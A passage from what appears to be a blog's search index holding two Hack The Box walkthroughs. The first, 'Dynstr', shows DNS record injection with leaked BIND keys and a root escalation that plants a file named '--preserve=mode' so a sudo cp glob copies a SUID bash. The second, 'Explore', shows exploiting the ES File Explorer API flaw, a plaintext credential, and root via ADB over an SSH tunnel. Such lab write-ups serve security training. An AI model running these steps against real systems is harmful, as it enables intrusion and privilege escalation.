attacker.infra.dyna.htb update add attacker.infra.dyna.htb 30 IN A 10.10.10.10 send www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key update failed: REFUSED   After some research, found that this REFUSED error could be due to the key used and, checking the directory where the ddns.key was located, found 2 other files (as below), where the include using the file infra.key worked successfully BUT I still wasn’t able to connect using SSH.   www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key -rw-r--r-- 1 root bind 100 Mar 15 20:44 /etc/bind/ddns.key -rw-r--r-- 1 root bind 101 Mar 15 20:44 /etc/bind/infra.key -rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key   Doing some troubleshooting, noticed that I was able to solve the attacker.infra.dyna.htb but the reverse lookup of the IP address wasn’t possible. To fix this, I have added another entry in the nsupdate command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records must be separated by a blank line, otherwise the update would fail.   www-data@dynstr:/dev/shm$ cat nsupdate server 127.0.0.1 update add attacker.infra.dyna.htb 30 A 10.10.10.10 send  update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb send www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key www-data@dynstr:/dev/shm$   After that adjustment, I was able to SSH as bindmgr and read the content of user.txt file   bindmgr@dynstr:~$ ls -la total 36 drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 . drwxr-xr-x 4 root    root    4096 Mar 15 20:26 .. lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt bindmgr@dynstr:~$ cat use cat: use: No such file or directory bindmgr@dynstr:~$ cat user.txt &lt;redacted&gt;   Root flag   As always, started with a sudo -l command, where I found that the bindmgr user is capable to run the script below as root:   bindmgr@dynstr:~$ sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User bindmgr may run the following commands on dynstr:     (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh bindmgr@dynstr:~   Checking its content, noticed one interesting entry in line 42, where the script, running as root, copies the file .version and all other existing files in the current directory (*) to $BINDMGR_DIR. Also, it requires a .version file in the current directory to be compared with the existing configuration in the server.   # Stage new version of configuration files. echo \"[+] Staging files to $BINDMGR_DIR.\" cp .version * /etc/bind/named.bindmgr/   After the first execution, noticed that .version was copied with root permissions, allowing us to abuse a SUID binary this way.   bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. cp: cannot stat '*': No such file or directory [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors:     /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ ls -la /etc/bind/named.bindmgr/ total 12 drwxr-sr-x 2 root bind 4096 Aug 16 18:22 . drwxr-sr-x 3 root bind 4096 Aug 16 18:22 .. -rw-r--r-- 1 root bind    2 Aug 16 18:22 .version   Checking the cp | GTFOBins for SUID, noticed that if cp has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of cp in this script.   One point seen in the page mentioned above is that we could use the parameter --preserve to preserve file attributes during the copy. Appending this parameter to execution could be achieved thanks to a bash feature called filename expansion, popularly known as globbing which expands the names of the files during command execution.  This behavior can be seen in the example below with echo:   bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ ls -l total 0 -rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh -rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ echo * file.sh test.txt   This could be exploited as we could also abuse that during cp execution, copying a previously SUID configured file, allowing us to escalate privileges.   This was achieved by running the steps below:      Copied /bin/bash to a working temp directory and changed its permissions, setting its SUID bit and creating the .version file.   bindmgr@dynstr:/tmp$ cd $(mktemp -d) bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ cp /bin/bash . bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ chmod u+s bash bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo 1 &gt; .version bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ ls -la total 1168 drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 . drwxrwxrwt 13 root    root       4096 Aug 16 19:22 .. -rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version      Created a file called --preserve=mode, so its name could be expanded as a parameter for cp during script execution, copying bash as root but keeping SUID set. We can confirm that as well using echo, also below   bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo \"\" &gt; ./--preserve=mode bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo * bash --preserve=mode      Ran the script using sudo   bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors:     /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'     /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'     /etc/bind/named.bindmgr/bash:40: unknown option 'YF'     /etc/bind/named.bindmgr/bash:40: unexpected token near '}'      Executed the bash binary with -p parameter, as stated in bash | GTFOBins, giving me an interactive shell as root and able to read contents of /root/root.txt file :smiley:   bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ /etc/bind/named.bindmgr/bash -p bash-5.0# ls -la total 1172 drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  . drwxrwxrwt 13 root    root       4096 Aug 16 19:09  .. -rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash -rw-rw-r--  1 bindmgr bindmgr       1 Aug 16 19:10 '--preserve=mode' -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:10  .version bash-5.0# cd /root bash-5.0# cat root.txt &lt;redacted&gt;   I hope you guys have enjoyed it!   See you at the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/10/htb-dynstr",
        "teaser": "https://i.imgur.com/89b1SdH.png"
      },{
        "title": "Walktrough: HTB Explore",
        "excerpt":"Hello guys!   This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This was my first Android machine in HTB and, besides not having ADB access directly, I was able to get SSH access from information obtained through a vulnerable app.   Hope you guys enjoy it!   Enumeration   As usual, started with a quick nmap scan to see published ports on this box:   $ nmap -sC -sV -Pn -oA quick 10.10.10.247 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:26 -03 Nmap scan report for 10.10.10.247 Host is up (0.072s latency). Not shown: 998 closed ports PORT     STATE    SERVICE VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings: |   NULL: |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port2222-TCP:V=7.91%I=7%D=8/16%Time=611A9FDB%P=x86_64-pc-linux-gnu%r(NU SF:LL,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\");  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds   5555/TCP - freeciv   As this is my first Android box, started researching about this freeciv service found. Interestingly I came across a write-up for a VulnHub machine that mentions that this port is used by ADB (Android Debug Bridge) but, differently from that one, this port is currently filtered. Let’s keep this information for now until we find a way to open it and get an interactive shell on the device.   To look for any other missing information, ran another nmap scan, this time to check all TCP ports, and found the following additional ports open:   $ nmap -p- -Pn -oA allPorts 10.10.10.247 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Sarting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:44 -03 Nmap scan report for 10.10.10.247 Host is up (0.070s latency). Not shown: 65530 closed ports PORT      STATE    SERVICE 2222/tcp  open     EtherNetIP-1 5555/tcp  filtered freeciv 37425/tcp open     unknown 42135/tcp open     unknown 59777/tcp open     unknown  Nmap done: 1 IP address (1 host up) scanned in 41.93 seconds $ nmap -p37425,42135,59777 -sV -Pn -oA Full 10.10.10.247 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:47 -03 Nmap scan report for 10.10.10.247 Host is up (0.071s latency).  PORT      STATE SERVICE VERSION 37425/tcp open  unknown 42135/tcp open  http    ES File Explorer Name Response httpd 59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port37425-TCP:V=7.91%I=7%D=8/16%Time=611AA4D5%P=x86_64-pc-linux-gnu%r(G SF:enericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Mon,\\x20 SF:16\\x20Aug\\x202021\\x2017:48:06\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\ SF:x20Precondition\\x20Failed\\r\\nDate:\\x20Mon,\\x2016\\x20Aug\\x202021\\x2017:4 SF:8:06\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\ SF:.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Mon,\\x2016\\x20Aug\\x202021\\x SF:2017:48:11\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pla SF:in;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x2 SF:0supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20R SF:equest\\r\\nDate:\\x20Mon,\\x2016\\x20Aug\\x202021\\x2017:48:11\\x20GMT\\r\\nCont SF:ent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r SF:\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version: SF:\\x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa SF:te:\\x20Mon,\\x2016\\x20Aug\\x202021\\x2017:48:26\\x20GMT\\r\\nContent-Length:\\ SF:x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection SF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq SF:,DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Mon,\\x2016\\x20Aug\\x SF:202021\\x2017:48:26\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\ SF:x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\? SF:\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?&lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TerminalSe SF:rverCookie,CA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Mon,\\x201 SF:6\\x20Aug\\x202021\\x2017:48:26\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent SF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r SF:\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20msts SF:hash=nmap\")%r(TLSSessionReq,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Mon,\\x2016\\x20Aug\\x202021\\x2017:48:26\\x20GMT\\r\\nContent-Length: SF:\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0 SF:e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\"); Service Info: Device: phone  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds   42135/TCP - ES File Explorer Name Response httpd   Searching for this service in searchsploit got one result for the Android platform.   $ searchsploit ES File Explorer ---------------------------------------------------------------------- ---------------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- --------------------------------- ES File Explorer 4.1.9.7.4 - Arbitrary File Read                      | android/remote/50070.py iOS iFileExplorer Free - Directory Traversal                          | ios/remote/16278.py MetaProducts Offline Explorer 1.x - FileSystem Disclosure             | windows/remote/20488.txt Microsoft Internet Explorer / MSN - ICC Profiles Crash (PoC)          | windows/dos/1110.txt Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - | windows/remote/19603.txt Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Ste | windows/remote/19094.txt Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type  | windows/remote/19468.txt Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Proto | windows/remote/24116.txt Microsoft Internet Explorer 5/6 - 'file://' Request Zone Bypass       | windows/remote/22575.txt Microsoft Internet Explorer 6 - '%USERPROFILE%' File Execution        | windows/remote/22734.html Microsoft Internet Explorer 6 - Local File Access                     | windows/remote/29619.html Microsoft Internet Explorer 7 - Arbitrary File Rewrite (MS07-027)     | windows/remote/3892.html My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities             | ios/webapps/28975.txt WebFileExplorer 3.6 - 'user' / 'pass' SQL Injection                   | php/webapps/35851.txt ---------------------------------------------------------------------- ---------------------------------   Initial Access and User flag   Checking this exploit, noticed that it relates to CVE-2019-6447, discussed in this post Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447) | by Knownsec 404 team | Medium   This vulnerability consists in a flaw that allow the execution of commands implemented by this app in an unauthenticated way, without the need of any kind of authorization. As it is simple, I have created a Powershell script to enumerate available information:   #!/usr/bin/pwsh  $methods = @('listFiles','listPics','listVideos','listAudios','listAppsAll','getDeviceInfo')  foreach($method in $methods){     Write-host \"&gt;&gt;&gt; Method: $method\" -foregroundcolor green     Invoke-RestMethod -method POST -header @{\"Content-Type\" = \"application/json\"} -body \"{'command':'$method'}\" -uri http://10.10.10.247:59777 | fl * }   From the received output, the most interesting result was one picture called creds.jpg   &gt;&gt;&gt; Method: listPics  name     : concept.jpg time     : 4/21/21 02:38:08 AM location : /storage/emulated/0/DCIM/concept.jpg size     : 135.33 KB (138,573 Bytes)  name     : anc.png time     : 4/21/21 02:37:50 AM location : /storage/emulated/0/DCIM/anc.png size     : 6.24 KB (6,392 Bytes)  name     : creds.jpg time     : 4/21/21 02:38:18 AM location : /storage/emulated/0/DCIM/creds.jpg size     : 1.14 MB (1,200,401 Bytes)  name     : 224_anc.png time     : 4/21/21 02:37:21 AM location : /storage/emulated/0/DCIM/224_anc.png size     : 124.88 KB (127,876 Bytes)   To download the file used the command below, also permited by the vulnerable app found:   curl --header \"Content-Type: application/json\" http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg   Opening the image in a viewer, noticed that we had some credentials on it: kristi:Kr1sT!5h@Rp3xPl0r3!      These credentials allowed me to connect through SSH on port 2222, as previously enumerated. The first flag was found at /sdcard/user.txt file:   $ ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $ cd /sdcard/ :/sdcard $ cat user.txt &lt;redacted&gt;   Root flag   As now we have SSH rights to this box, we could get root access using ADB shell using SSH Local Port redirection, where I’ve redirected my attacker’s machine 5555/TCP to 5555/TCP in the target, via SSH as seen in the previously mentioned post.   $ ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555 Password authentication Password: :/ $   After this process, just needed to connect to adb in attacker machine from port redirection, tunneled through SSH connection and, to get root access, just needed to issue the command su.   $ adb connect 127.0.0.1:5555 connected to 127.0.0.1:5555 $ adb shell x86_64:/ $ su :/ # find / -type f 2&gt; /dev/null | grep root.txt /data/root.txt :/ # cat /data/root.txt &lt;redacted&gt;   I hope you guys have enjoyed this box!   See you in the next post :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Android"],
        "url": "/walkthrough/2021/10/htb-explore",
        "teaser": "https://i.imgur.com/TJKS5F6.png"
      }]
